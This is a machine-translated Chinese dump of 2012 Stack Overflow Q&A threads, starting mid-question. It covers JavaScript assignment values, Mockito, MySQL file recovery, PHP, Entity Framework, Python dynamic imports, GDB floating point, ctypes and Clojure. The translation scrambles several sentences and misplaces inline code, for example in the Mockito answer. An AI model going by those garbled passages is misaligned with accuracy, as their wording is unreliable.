在 JavaScript 中，表达式 eg`(data = new MyObject())`计算为*MyObject*对象；而在像 C 这样的语言中，表达式的值总是`true`.

在上面的代码片段中，`(data = new MyObject())`仅用于执行与以下完全相同的操作的快捷方式？

```
...
var $my_div = $('#target'),
    data = new MyObject();
$my_div.data('extra', data); 
```

**澄清**：我最初不确定`(data = new MyObject())`实际上是做什么的。我想知道为什么不将该表达式分隔在自己的行中，而不是在`.data()`. `.data()`问题是在做这个表达或单独做这个表达之间是否有任何区别。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-12T23:36:51.657

> 在 JavaScript 中，表达式 eg 的`(data = new MyObject())`计算结果为`MyObject`object；而在像 C 这样的语言中，表达式的值总是`true`

不，在 C 中就像在 JavaScript 中一样，类似表达式的结果是对`MyObject`对象的引用。不过，非`null`对象引用是真实的（在两种语言中）。

在所有从 B 语法派生的语言（包括 C、Java、JavaScript、C# 和其他十几种语言）以及可能来自其他家族的大多数语言中，*赋值表达式*的结果是该表达式的右侧。例如：

```
a = b = c; 
```

...表示“分配`c`to的值`b`，然后将其再次分配给 to`a`而无需重新评估”。这并不*意味着*“分配`c`给`b`，然后分配`true`给`a`”。我不知道一种语言会意味着什么（这并不意味着不存在）。在某些语言系列中，它的意思是“比较并将比较`b`的`c`结果分配给`a`”（不改变`b`or `c`），因为`=`在这些语言中作为赋值运算符和比较运算符，取决于上下文，并且在那个上下文中，它具有双重职责（*右侧*产生式），它是一个比较运算符。（BASIC 语言就是这样。）

这不是一个真正的*答案*，因为没有问题。但希望它有帮助...

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-12T23:43:37.167

大多数语言中的赋值运算符实际上计算为赋值的值（=就像在 JavaScript 中一样）。例如，在 C 代码中通常会看到类似下面的内容：

```
MyObject* config = NULL;
if (config = parse_config()) {
   // config is not NULL
} 
```

这只是特定语言如何解释某些东西的问题（例如，如果它将非空指针视为真）。有些（如 C# 或 Java）不要求您具体说明，如：

```
MyObject config = null;
if ((config = ParseConfig() != null) {
   // config is not null
} 
```

但是，它似乎不那么可读，所以很少有人使用它。

至于你的问题，这些例子也是如此——没有发现隐藏的魔法:)

# scala - 使用 POST 进行 scala 测试

> ID：13353410
> 
> 赞同：0
> 
> 时间：2012-11-12T23:35:48.340
> 
> 标签：scala, mockito

有谁知道如何比较存储库函数 (chirpsRepository.save) 和我在 api(api.saveChirp) 中实现的函数来查看测试是否正确？

问题是 chirpsRepository.save 是一个无效函数，我不知道如何测试它！！！

```
 "POST /api/chirps" should "return status Ok" in {
       new TestChirpsApi {
         println("AAAAAAAAAAAAAA")
         println(api.saveChirp(NewChirp("John Doe message")))
         when(chirpsRepository.save(ChirpRecord(new ObjectId("503df1850364e1967b576e5d"), "My message is here"))).thenReturn("Ok")
         println("BBBBBBBBBBBBBB")
         assert(api.saveChirp(NewChirp("John Doe message")) === "Ok")

      }
  } 
```

感谢您的帮助，如果有人知道用于测试的 scala 和 mockito 指南，我将很高兴知道。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T01:36:55.200

无效的事实实际上`chirpsRepository.save()`并不重要 - 您应该测试的是是否调用了该方法。

因此，与其尝试在其上定义模拟行为（使用），不如在调用*后*`when(...)`使用该`verify()`方法以确保它正确委派。*`api.saveChirp()`*

 *[Mockito 文档](http://mockito.googlecode.com/hg-history/1.5/javadoc/org/mockito/Mockito.html)非常详尽 - 一旦您了解应该模拟哪些协作者以及*应该*验证*哪些*协作者，您应该没有问题。*

# mysql - 如何从 .FRM 恢复我的 MYI、MYD 表

> ID：13353412
> 
> 赞同：4
> 
> 时间：2012-11-12T23:35:49.253
> 
> 标签：mysql, phpmyadmin

> **可能重复：**
> [如何从 .myd、.myi、.frm 文件中恢复 mysql db](https://stackoverflow.com/questions/879176/how-to-recover-mysql-db-from-myd-myi-frm-files)

我在这里看到了这个问题，但老实说，无法理解发布的任何解决方案。在出现一些问题后，我刚刚重新安装了 windows vista，并且我确实为旧安装的 Mysql 复制了整个“数据”文件夹。MySQL 的原始和新安装版本是 5.0.85。

phpMyAdmin 的原始版本是 3.2.1，但我现在安装了最新版本：3.5.3。问题是我丢失了一些我认为是表和索引文件的 MYI 和 MYD 文件。存在所有 .FRM 文件和一个 ibdata1 文件（还有 ib_logfile0 和 ib_logfile2）。

这些表显示在 phpMyAdmin 中的某些屏幕中，例如“分配表级别权限”下拉菜单 - 所以它们似乎仍然存在，但它们没有出现在显示 aDB 中所有表的左列中。它们是可以恢复的还是永远丢失的？对于新手来说，我将不胜感激任何足够详细的帮助。我以前设置过 WAMP，但从未遇到过这个问题。

在此先感谢...

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-12T23:42:12.530

这些`.frm`文件仅包含有关表结构的元数据。它们不包含您的数据。

对于 MyISAM 表， `.MYD`文件基本上就是表（没有元数据或索引）；如果它消失了，你的数据就消失了。可能有一种方法可以生成“空”文件并重新开始，但是是的。没有它们，您就没有数据。

这些`.MYI`文件包含索引，AFAIK。这些可以重新生成，但不能没有数据。

但是，如果您的表是 InnoDB 表，那么您*可能*很幸运。InnoDB 表不会有`.MYD`or `.MYI`；本来在其中的数据将改为在`ibdata1`. 您可能能够（在停止 mysqld 之后）简单地将`.frm`和`ib*`文件偷偷放到正确的位置，并让 mysqld 在重新启动时看到它们。

当然，如果您已经*有*InnoDB 数据文件，这将不起作用——或者更确切地说，如果有，您最终会丢失任何现有的 InnoDB 表。但是，在这种情况下，您可以将文件放入另一个目录并启动指向该目录的 mysqld 实例。这对您来说就足够了`mysqldump`，因为您可以将表作为 SQL，因此您可以将其导入到新数据库中。

# php - 如何从终端发布参数到php

> ID：13353417
> 
> 赞同：2
> 
> 时间：2012-11-12T23:36:13.200
> 
> 标签：php, terminal

如果我有一个名为 somephpfile.php 的文件，我可以使用以下命令从终端窗口执行此操作：“php somephpfile.php”

如果我想从 php 文件将通过 $_POST 接收的终端传递参数，我该怎么做？

谢谢，

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-12T23:37:59.187

你没有，也没有帖子：

```
php somephpfile.php var1 var2 
```

`$var1`并将`$var2`在`$argv`数组中。

更多细节： http: [//php.net/manual/en/reserved.variables.argv.php](http://php.net/manual/en/reserved.variables.argv.php)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-12T23:39:41.130

如果您想通过接收参数，`$_POST`那么您需要将您的 PHP 文件托管在合适的 Web 容器中（想想 Apache + mod-php）并通过适当的 HTTP 请求调用它。它是设置`$_POST`.

无论如何，一旦您进行了适当的设置，以下答案将告诉您如何做您想做的事情：

[https://superuser.com/questions/149329/what-is-the-curl-command-line-syntax-to-do-a-post-request](https://superuser.com/questions/149329/what-is-the-curl-command-line-syntax-to-do-a-post-request)

* * *

## 回答 #3

> 赞同：-2
> 
> 时间：2012-11-12T23:45:54.357

看这里：[如何在通过php发布值后获取aspx页面的html内容](https://stackoverflow.com/questions/11947419/how-to-get-html-content-of-aspx-page-after-post-value-by-php/11947715#11947715)

您可能会得到 Dagon 所说的变量，并按照链接中的说明发布它们。

* * *

## 回答 #4

> 赞同：-2
> 
> 时间：2012-11-12T23:47:29.243

使用 telnet 做一个 HTTP POST 在互联网上看一些例子，快速搜索会得到 [http://terrencemiao.com/Webmail/msg00197.html](http://terrencemiao.com/Webmail/msg00197.html)

# c# - EF5 & Detached POCO，导航属性返回 null

> ID：13353419
> 
> 赞同：2
> 
> 时间：2012-11-12T23:36:32.270
> 
> 标签：c#, repository-pattern, poco, entity-framework-5

我有一个问题，我相信可以通过简单的理解来解决。我正在使用带有代码优先和 POCO 的 Entity Framework 5。我为我的所有 POCO 对象正确配置了所有导航属性（虚拟）。当我查询一个对象（PO​​CO）然后返回该 POCO 作为结果时，就会出现问题。POCO 的所有导航属性都为空：

```
class PocoParent  { // all of these are properties (get/set)
    public int Id;
    public string ParentProperty;
    public virtual PocoChild NavProperty;
}
class PocoChild {
    public int Id;
    public int ParentId;
    public string Name;
    public virtual PocoParent Parent;
} 
```

在处理我的查询的存储库类中：

```
IEnumerable<PocoChildren> GetAllChildrenFor(int parentId) {
    using(Context db = new Context()) {
        var pcs = db.PocoParents.Where(p => p.Id == parentId);
        return pcs;
    }
} 
```

现在使用存储库：

```
...
var children = repo.GetAllChildrenFor(queriedParent.Id);
... 
```

现在使用存储库中的结果，这是发生错误的地方：

```
...
foreach(child in children) {
   if(child.Parent.NavProperty == "null") {  !!! Exception: child.Parent ObjectContext already disposed
   }
}
... 
```

如何处理 ObjectContext（分离 POCO 对象），但至少保留一级导航属性？我一直在寻找解决方案，但我很困惑，因为解决方案在如何做到这一点上相互冲突。

--- 回顾 ---- 使用下面给出的答案，如果我要将存储库中的查询更改为以下内容：

```
IEnumerable<PocoChildren> GetAllChildrenFor(int parentId) {
    using(Context db = new Context()) {

        var pcs = db.PocoParents.Include(p => p.Select(prop => prop.Parent).Where(p => p.Id == parentId);

        return pcs;
    }
} 
```

这会返回所有实体，它们将包含一个非空的 .Parent 属性，或者我指定的任何属性？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-12T23:44:06.927

默认情况下启用延迟加载，这就是可导航属性为空的原因。延迟加载意味着可导航属性在被请求之前不会加载。如果在请求它们时上下文消失了，它们会被设置为 null，因为它们无法加载。

为了解决这个问题，您需要禁用延迟加载或显式（并且急切地）加载您需要的属性。

这篇[MSDN 杂志文章](http://msdn.microsoft.com/en-us/magazine/hh205756.aspx)是一个很好的来源，可以帮助您确定最适合您的路线。

# python - 从字符串导入 Python 中的模块

> ID：13353421
> 
> 赞同：2
> 
> 时间：2012-11-12T23:36:36.310
> 
> 标签：python

我有`type`一个值为“MBSquareObject”的字符串。`MBSquareObject`是一个名为`MBObject`. 我想`MBSquareObject`动态导入。

如果方形对象在其自己的文件中，则此方法有效：

```
__import__(type) 
```

但是，我想做的是相当于`from MBObject import MBSquareObject`. 但是，这不起作用：

```
from MBObject __import__(type) 
```

我还能怎么做？

编辑：给出的答案是假设 MBSquareObject 是 MBObject 上的某种对象，但它只是另一个类。MBSquareObject 是 MBObject 的子类，因此它们列在同一个文件中。

编辑：由于某种原因，没有一个答案有效。这是我所拥有的：

```
# this is imported at the top of the file
from MBObject import MBObject
type = 'MBSquareObject'
__import__('MBObject', globals(), locals(), [type])
object_class = eval(type)
object = object_class() 
```

错误：NameError：未定义名称“MBSquareObject”

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-12T23:41:30.583

您的示例表明`MBObject`不需要动态访问模块名称，只需访问内部的对象即可。在这种情况下，你可以这样做

```
import MBObject
thing  = getattr(MBObject, type) 
```

编辑：一个问题是你给你的模块和类赋予了相同的名称，这使得在你的代码中很难区分它们。您在类和模块之间感到困惑。你有*两个*叫做 MBObject 的东西。一个是模块，另一个是该模块内的类。当你这样做时`from MBObject import MBObject`，你导入了类，但没有给自己模块的引用，这使得随后从同一个模块导入第二个类（MBSquartObject）变得很尴尬。

你可以使用我上面给出的代码得到你想要的效果，但是你*不能*这样做`from MBObject import MBObject`——当你这样做时，你没有给自己一个模块的引用，只有那个模块中的类。相反，只需做`import MBObject`，然后通过`MBObject.MBObject`.

如果您希望能够引用同一模块中的 MBObject 类和其他类而不用模块名称作为前缀，请给模块一个不同的名称。Python 风格指南建议在 MixedCase 中以所有小写和类命名模块。所以将你的模块命名为 mbobject.py。然后你可以这样做：

```
import mbobject
from mbobject import MBObject
thing = getattr(mbobject, type) 
```

一般来说，在 Python 中为模块和类赋予相同的名称并不是一个好主意。模块和类是不同的东西，给它们取相同的名称可能会导致这样的混淆，你不清楚你是在处理模块还是类。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-12T23:43:59.970

[`__import__`](http://docs.python.org/2/library/functions.html#__import__)可以采用额外的参数来准确指定应该导入哪些对象。从这个函数的返回中，您可以获取您想要的任何对象。

```
source_module = 'MBObject'
object_in_module = 'MBSquareObject'

obj = getattr(__import__(source_module, globals(), locals(), [object_in_module]),
              object_in_module) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-12T23:44:18.333

尝试这个：

```
module = __import__('MSObject', globals(), locals(), ['MBSquareObject'], -1) 
```

使用此处找到的示例将它们连接在一起：

[http://docs.python.org/2/library/functions.html#**导入**](http://docs.python.org/2/library/functions.html#__import__)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-12T23:49:16.847

该`__import__`函数的完整语法在[文档](http://docs.python.org/2/library/functions.html#__import__)中进行了描述：

```
 __import__(name[, globals[, locals[, fromlist[, level]]]]) 
```

这`fromlist`是要从导入模块导入的项目列表。像这样的声明

```
 from module import object1, object2 
```

被实现为

```
module = __import__('module', globals(), locals(), ['object1', 'object2'])
object1 = getattr(module, 'object1')
object2 = getattr(module, 'object2') 
```

所以在你的情况下，你可以使用

```
module = __import__('MBObject', globals(), locals(), [type])
the_object = getattr(module, type) 
```

在 Python 的最新版本中，自 3.1 起，[`importlib`](http://docs.python.org/dev/library/importlib.html)您可能可以使用一个模块来执行此操作。虽然我能找到的唯一方法是使用模块的实现`__import__`，它与内置实现基本相同，所以我想你最好使用内置的。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-12T23:41:17.690

怎么样：

```
module = __import__('MSObject.' + 'MBSquareObject') 
```

# android - 在 onPause 或后台更新 UI

> ID：13353423
> 
> 赞同：1
> 
> 时间：2012-11-12T23:36:51.567
> 
> 标签：android, user-interface

我有两个活动，A 和 B。如果启动 A，然后启动 B，则 A 进入 onPause。

在这种情况下，如果我想更新 Activity A 的 UI，我应该怎么做？

我在模拟器上没有任何问题。我的意思是在这种情况下，我可以毫无问题地更新 Activity A 的 UI，但它在真实设备（手机）上不起作用并且注意到发生了变化。

解决方案/解决方案是什么？

先感谢您。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T23:41:37.573

因为 A 已暂停，所以无需更新 UI（文本视图、列表视图、微调器等）。您可能正在谈论从B更新A内部的一些信息。如果您想将一些新信息从B传递给A，您应该使用`startActivityForResult()`方法或类似方法让A等待一些结果，并将B的一些额外信息传递给A。然后，你可以真正从`onResume()`方法更新A的UI（你需要覆盖它）

[在此处](http://android.rahulblogs.com/android-startactivityforresult-example/)获取示例

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-12T23:45:11.447

您可以在 Activity A 中更新 UI `onResume()`。您可以将更新的信息放入 an`Intent`并使用它来启动`Activity`A。在A 中`onResume()`，`Activity`您从`Intent`using`getIntent()`方法获取信息，然后根据需要更新 UI。

# bash - 在 Bash 中循环数据并分配变量

> ID：13353426
> 
> 赞同：1
> 
> 时间：2012-11-12T23:37:03.750
> 
> 标签：bash, loops, variables

我有一个包含以下信息的文本文件。我需要遍历这个文本文件（count.txt）并为这些数字中的每一个分配一个变量，无论变量的名称是什么。这可能吗？

> ```
> 4552  856
> 2070  298
> 1993  749
> 4774  248
> 2818  720
> 7912  1204
> 55    16
> 2     2
> 5     3
> 74    19
> 7310  1635
> 278   87
> 88    36
> 53    11
> 1081  252
> 1409  344
> 176   120
> 3219  1052
> 401   83
> 5008  1026
> 1885  276
> 13    9
> 1     1
> 11    5
> 5584  1586
> 10623 2635
> 27    11
> 39    5
> 310   178
> 1742  713
> 5     4
> 14    7
> 3     2 
> ```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-12T23:38:21.183

是的，尝试这样做：

```
while read a b; do echo "$a $b"; done < count.txt 
```

如果您想保留所有记录：

```
array=( $(<count.txt) )
printf '%s\n' ${array[@]} 
```

# facebook - 使用 Facebook C# SDK 进行实时更新

> ID：13353427
> 
> 赞同：1
> 
> 时间：2012-11-12T23:37:15.510
> 
> 标签：facebook, facebook-c#-sdk, real-time-updates

使用最新版本的 C# Facebook SDK 创建 MVC 3 Web 应用程序。到目前为止，检索访问令牌和以下用户数据没有问题，下一步我需要做的是使用 Facebook 的实时更新功能来确保我的用户 Facebook 数据是最新的。我猜 C# SDK 可以处理这个问题，我只是找不到任何东西。有谁知道那里有什么好的例子，或者有什么提示可以为我指明正确的方向？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-19T22:29:51.167

这现在在 Facebook c# sdk 中处理，[https://github.com/facebook-csharp-sdk/facebook-csharp-sdk/pull/219](https://github.com/facebook-csharp-sdk/facebook-csharp-sdk/pull/219)。

# google-apps-script - 将自定义雷达图嵌入电子表格

> ID：13353429
> 
> 赞同：0
> 
> 时间：2012-11-12T23:37:28.823
> 
> 标签：google-apps-script, google-sheets, google-visualization

我在 Charts api 中看不到 Radar 图表类型，但我们可以将使用此工具设计的图表类型 - [https://developers.google.com/chart/image/docs/chart_wizard](https://developers.google.com/chart/image/docs/chart_wizard)与电子表格中的数据联系起来并将其嵌入也？是这样，我们将如何去做呢？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T18:24:33.893

如果您可以获得图表的图像 URL，那么您可以使用`app.createImage()`.

# c++ - 为什么 GDB 对浮点运算的评估与 C++ 不同？

> ID：13353437
> 
> 赞同：16
> 
> 时间：2012-11-12T23:38:25.420
> 
> 标签：c++, floating-point, gdb, floating-accuracy

在尝试处理浮点算术问题时，我遇到了一些令人困惑的事情。

首先，代码。我将问题的本质提炼到了这个例子中：

```
#include <iostream>
#include <iomanip>

using namespace std;
typedef union {long long ll; double d;} bindouble;

int main(int argc, char** argv) {
    bindouble y, z, tau, xinum, xiden;
    y.d = 1.0d;
    z.ll = 0x3fc5f8e2f0686eee; // double 0.17165791262311053
    tau.ll = 0x3fab51c5e0bf9ef7; // double 0.053358253178712838
    // xinum = double 0.16249854626123722 (0x3fc4ccc09aeb769a)
    xinum.d = y.d * (z.d - tau.d) - tau.d * (z.d - 1);
    // xiden = double 0.16249854626123725 (0x3fc4ccc09aeb769b)
    xiden.d = z.d * (1 - tau.d);
    cout << hex << xinum.ll << endl << xiden.ll << endl;
} 
```

`xinum`并且`xiden`应该具有相同的值（何时`y == 1`），但由于浮点舍入误差，它们没有。我得到的那部分。

当我通过 GDB 运行这段代码（实际上是我的真实程序）以追踪差异时，问题出现了。如果我使用 GDB 重现代码中所做的评估，它会为 xiden 提供不同的结果：

```
$ gdb mathtest
GNU gdb (Gentoo 7.5 p1) 7.5
...
This GDB was configured as "x86_64-pc-linux-gnu".
...
(gdb) break 16
Breakpoint 1 at 0x4008ef: file mathtest.cpp, line 16.
(gdb) run
Starting program: /home/diazona/tmp/mathtest 
...
Breakpoint 1, main (argc=1, argv=0x7fffffffd5f8) at mathtest.cpp:16
16          cout << hex << xinum.ll << endl << xiden.ll << endl;
(gdb) print xiden.d
$1 = 0.16249854626123725
(gdb) print z.d * (1 - tau.d)
$2 = 0.16249854626123722 
```

您会注意到，如果我让 GDB 计算`z.d * (1 - tau.d)`，它会给出 0.16249854626123722 (0x3fc4ccc09aeb769a)，而在程序中计算相同内容的实际 C++ 代码会给出 0.16249854626123725 (0x3fc4ccc09aeb769b)。所以 GDB 必须对浮点运算使用不同的评估模型。任何人都可以对此有所了解吗？GDB 的评估与我的处理器的评估有何不同？

我确实看过[这个相关的问题](https://stackoverflow.com/questions/5122570/why-does-gdb-evaluate-sqrt3-to-0)，询问 GDB 评估`sqrt(3)`为 0，但这不应该是同一件事，因为这里不涉及函数调用。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-13T00:03:03.817

Could be because the x86 FPU works in registers to 80 bits accuracy, but rounds to 64 bits when the value is stored to memory. GDB will be storing to memory on every step of the (interpreted) computation.

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-13T00:55:53.983

GDB 的运行时表达式评估系统当然不能保证为您的浮点运算执行与您的编译器为计算相同符号表达式的结果而生成的优化和重新排序的机器代码相同的有效机器代码。实际上，保证不会执行相同的机器代码来计算给定表达式的值`z.d * (1 - tau.d)`，因为这可能被认为是程序的一个子集，在运行时以某种任意的“符号正确”方式对其执行隔离表达式求值.

由于优化（替换、重新排序、子表达式消除等）、指令的选择、选择寄存器分配和浮点环境。如果您的代码片段在临时表达式中包含许多自动变量（就像您的那样），则代码生成具有特别大的自由度，即使优化通过次数为零，并且这种自由度带来了 - 在这种情况下 - 失去精度的机会以一种看起来不一致的方式出现的最不重要的位。

您将无法深入了解 GDB 的运行时评估程序为何执行它所做的任何指令，而无需深入了解 GDB 源代码、构建设置和它自己的编译时生成的代码。

您可以在为您的过程生成的程序集上达到峰值，以了解最终存储到`z`、`tau`和 [相反] 中的`xiden`工作方式。导致这些存储的浮点运算的数据流可能不像看起来那样。

更容易的是，尝试通过禁用所有编译器优化（例如，`-O0`在 GCC 上）并重写浮点表达式以不使用临时/自动变量来使代码生成更具确定性。然后在 GDB 中的每一行打断并进行比较。

我希望我能准确地告诉你为什么尾数的最不重要的位被翻转，但事实是，处理器甚至不“知道”为什么有些东西携带了位，而其他的东西却没有，例如，订单没有完整的代码和 GDB 本身的指令和数据跟踪的评估。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-12T23:59:44.147

它不是 GDB 与处理器，而是*内存*与处理器。x64 处理器存储的精度比内存实际保存的精度高（80 位对 64 位）。只要它留在 CPU 和寄存器中，它就会保持 80 位左右的精度，但是当它被发送到内存时，将决定它何时以及如何四舍五入。如果 GDB 将所有间歇性计算结果从 CPU 发送出去（我不知道是这种情况，还是接近），它会在*每*一步都进行舍入，这会导致结果略有不同。

# php - 需要从一个大数组创建子数组

> ID：13353457
> 
> 赞同：1
> 
> 时间：2012-11-12T23:40:39.947
> 
> 标签：php, arrays, multidimensional-array

请帮我解决一个我真正陷入 PHP 的问题

我有一个大数组

```
$a = array(
    'foo_1' => 'Dog',
    'bar_1' => 'Cat',
    'baz_1' => 'Fish',
    'foo_2' => 'Frog',
    'bar_2' => 'Bug',
    'baz_2' => 'Ddd',
    ...
); 
```

并且需要将其转换为多个数组：

```
$a_1 = array(
    'foo' => 'Dog',
    'bar' => 'Cat',
    'baz' => 'Fish'
);  

$a_2 = array(
    'foo' => 'Frog',
    'bar' => 'Bug',
    'baz' => 'Ddd'
); 
```

正如你所注意到的，有一个小逻辑。大数组应该由键集（ _1,_2,_3 ; _1,_2,_33 ）分割

希望我足够清楚！

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-12T23:52:16.137

假设密钥总是每**3 个**项目重复一次*并且*它们是有序的，`array_chunk`那么会起作用：

```
$newArray = array_chunk($a, 3); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-12T23:57:08.880

假设`$a`有这个结构（因为 OP 原始数组有重复的键）：

```
$a = array(
'foo_1' => 'Dog',
'bar_1' => 'Cat',
'baz_1' => 'Fish',
'foo_2' => 'Frog',
'bar_2' => 'Bug',
'baz_2' => 'Ddd'
); 
```

您可以通过这种方法转换数组：

```
$temp = array();
foreach($a as $key=>$val){
    $num = substr(strrchr($key, '_'), 1);
    $nkey = basename($key, '_'.$num);
    $temp[$num][$nkey] = $val;
}
// See what happens
print_r($temp); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-12T23:46:41.987

我确定多维数组更好，但这就是您所要求的，“_”之前具有相同字符串的值将被覆盖（丢失），因此您的逻辑可能存在问题。

```
$array1 = array();
$array2 = array();
$array3 = array();
$bigArray = array('av_1'=>'dghdfg','ab_2'=>'dgdfg');
foreach($bigArray as $key=>$value)
{
  $splitKey = explode('_',$key);
  $number = $splitKey[1];
  $newKey = $splitKey[0];
  $varName = "array".$number;
  ${$varName}[$newKey] = $value;
} 
```

**多维：**

```
 $newBigArray = array();
    $bigArray = array('av_1'=>'dghdfg','ab_2'=>'dgdfg');

    foreach($bigArray as $key=>$value)
    {
      $splitKey = explode('_',$key);
      $newKey = $splitKey[0];
      $number = $splitKey[1];

      if(!isset($newBigArray[$newKey])) {
        $newBigArray[$newKey] = array();
      }
      $newBigArray[$newKey][$number] = $value;
    }
    var_dump($newBigArray); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-13T00:00:03.730

获取所有数组条目的键，用下划线字符（_）分割它们，然后将它们放入一个数组中。

```
$a = array(
    'foo_1' => 'Dog',
    'bar_2' => 'Cat',
    'baz_3' => 'Fish',
    'foo_1' => 'Frog',
    'bar_2' => 'Bug',
    'baz_3' => 'Ddd',
    ...
);

$arrays = array(
    'foo' => array(),
    'bar' => array(),
    'baz' => array()
);

foreach ($a as $k => $v) {
    $s = explode("_", $k);
    if (!isset($arrays[$s[0]])) {
        $arrays[$s[0]] = array();
    }
    $arrays[$s[0]][$s[1]] = $v; // This line if you want to preserve the index (1, 2, ...)
    $arrays[$s[0]][] = $v; // Or this line if you want to reindex the arrays.
    // Comment or remove one of these two lines.
} 
```

然后你有一个多维数组：

```
array(
    'foo' => array(
       "Dog",
       "Frog"
    ),
    'bar' => array(
        "Cat",
        "Bug"
    ),
    'baz' => array(
        "Fish",
        "Ddd"
    ),
    ...
) 
```

我建议您使用上面的多维数组，但如果您想为每个*“键”*（如“foo”、“bar”等）创建一个新变量，请使用以下代码段：

```
$a = array(
    'foo_1' => 'Dog',
    'bar_2' => 'Cat',
    'baz_3' => 'Fish',
    'foo_1' => 'Frog',
    'bar_2' => 'Bug',
    'baz_3' => 'Ddd',
    ...
);

foreach ($a as $k => $v) {
    $s = explode("_", $k);
    ${$s[0]}[$s[1]] = $v; // This line if you want to preserve the index (1, 2, ...)
    ${$s[0]}[] = $v; // Or this line if you want to reindex the arrays.
    // Comment or remove one of these two lines.
} 
```

* * *

*请注意，您的数组`$a`有一些重复的键，这在 PHP 中是不可能的。*
**编辑：**我看到你解决了。

# python - Mac OS X 和 Ubuntu 之间的 Python/ctypes 文件句柄差异

> ID：13353462
> 
> 赞同：2
> 
> 时间：2012-11-12T23:41:17.940
> 
> 标签：python, ctypes

我目前正在尝试在我的 linux 机器（Ubuntu 12.04.1 LTS）和我的新 Mac（OS X 10.7.4）之间移植一些代码，并且在使用 python 的 ctypes 模块访问 C 标准库时遇到了一些令人困惑的行为麦克。

为了说明这个问题，下面是一个最小的例子：

```
import ctypes as C
import numpy as np

libc = C.CDLL("/usr/lib/libc.dylib")   #/usr/lib/libc.so.6 on ubuntu

np.arange(10,dtype="ubyte").tofile("test.bin") # create some test data

buffer_array = np.empty(10,dtype="ubyte") # create a reading buffer

buffer_array_c = np.ctypeslib.as_ctypes(buffer_array) # get the ctypes version of the buffer 

c_file = libc.fopen("test.bin","r") # open the file through libc   

libc.fread(buffer_array_c, 1, 10, c_file) # read from the file

libc.fclose(c_file)

print "Desired output:"
print np.fromfile("test.bin",dtype="ubyte")
print
print "Actual output:"
print buffer_array 
```

在 Linux 上，这可以按预期工作，产生以下结果：

```
Desired output:
[0 1 2 3 4 5 6 7 8 9]

Actual output:
[0 1 2 3 4 5 6 7 8 9] 
```

然而，在 Mac 上，我只是得到“分段错误：11”。

我已经对此进行了一些实验，将 fopen 调用替换为：

```
py_file = open("test.bin","r")

c_file = C.pythonapi.PyFile_AsFile(C.py_object(py_file)) 
```

这也适用于 Linux，但不适用于 Mac。

我认为问题来自使用 c_file 调用 fread，就好像我编写了一个最小的 C 函数来打开文件然后使用先前分配的缓冲区调用 fread，代码按预期执行。

我通常不是 Mac 用户，所以问题可能很明显，但任何帮助都会非常有用。

作为参考，我正在使用：

Python 2.7.3、Numpy 1.4.0 和 Ctypes 1.1.0

## 编辑：

为了给出一些背景信息，我正在尝试使用快速方法将非常大的二进制文件（~40-200 GB）逐个读入python。正如评论者在下面指出的那样，直接访问标准库 fread 和 fwrite 函数并没有真正提高性能。这是真的，但我不知道为什么。如果我要使用 numpy.fromfile 以块的形式读取一个大文件，我不会在每次读取时创建一个新的内存分配吗？

## 解决方案：

问题似乎源于文件句柄存储的 64 位/32 位差异。解决方案只是在使用之前显式设置每个 c 函数的 restype 和 argtypes。

即在 64 位机器上，我们把它放在 C.CDLL 调用之后：

```
lib.fopen.restype = C.c_long
lib.fread.argtypes = [C.c_void_p, C.c_size_t, C.c_size_t, C.c_long]
lib.fclose.argtypes = [C.c_long] 
```

在 32 位机器上：

```
lib.fopen.restype = C.c_int
lib.fread.argtypes = [C.c_void_p, C.c_size_t, C.c_size_t, C.c_int]
lib.fclose.argtypes = [C.c_int] 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-16T01:41:10.173

您是在尝试 32 位 Ubuntu 还是 64 位 OS/X？我认为问题在于您的 libc.fopen() 版本返回一个 C“int”，它几乎总是一个 32 位值 --- 但真正的 fopen() 返回一个指针。所以在 64 位操作系统上，你得到的 c_file 被截断为 32 位整数。在 32 位操作系统上，它无论如何都可以工作，因为 32 位整数可以传递回 fread() 和 fclose()，这将再次将其解释为指针。要修复它，您需要声明 libc.fopen() 的 restype。

（我只能推荐[CFFI](http://cffi.readthedocs.org/en/latest/)作为具有更合理默认值的 ctypes 的替代品，但作为作者之一，我当然不赞成 :-)

# clojure - Clojure 中的固定长度堆栈结构

> ID：13353463
> 
> 赞同：8
> 
> 时间：2012-11-12T23:41:19.017
> 
> 标签：clojure, queue

固定长度堆栈（我最初将其称为队列，但我想要的是堆栈）的最佳数据结构是什么，其中项目被添加到前面，并且每次将项目添加到前面时，都会从结尾？也可以从前面访问各种长度的子向量。我正在使用向量，现在考虑 clojure.lang.PersistentQueue 和手指树。

编辑，澄清，类似：

```
> (def q (queue [1 2 3 4]))
[1 2 3 4]
> (push q 9 8 7)
[7 8 9 1]
> (peek (push q 9 8 7))
7 
```

编辑2：感谢您到目前为止的所有回答，这已经变成了回归基础和阅读 Clojure 的乐趣的练习，例如学习 subvec 的 subvec 保留对第一个 subvec 向量的引用，而类似 (vec (cons x (subvec... 如果重复使用会累积对所有中间 subvec 的引用。鉴于此，对于基于向量的队列的推送实现如何？：

```
